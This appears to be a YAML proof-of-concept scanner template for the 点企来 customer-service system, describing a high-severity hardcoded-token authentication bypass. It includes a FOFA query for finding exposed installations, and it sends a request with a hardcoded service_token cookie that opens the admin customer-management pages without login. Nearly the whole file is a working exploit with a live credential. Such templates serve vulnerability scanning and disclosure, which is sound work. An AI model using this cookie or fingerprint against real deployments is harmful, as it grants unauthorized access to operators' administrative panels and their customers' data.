id: poc-yaml-zjhejiang-token-hardcoded
info:
  name: 点企来客服系统 token 存在硬编码未授权漏洞
  severity: high
  tags:
  - 硬编码凭据
  finger: 点企来客服管理系统
  fofa: body="layui-form-item" && body="/admin/login/check.html"
requests:
- method: GET
  path: /admin/custom/index.html
  expression: 'status_code == 302 &&

    body == ""

    '
- method: GET
  path: /admin/custom/index.html
  headers:
    Cookie: service_token=OuwfoovK%2BIdd
  expression: 'status_code == 200 &&

    contains(body,"客服系统") &&

    contains(body,"系统首页") &&

    contains(body,"客户管理")

    '
variables: {}
transport: http
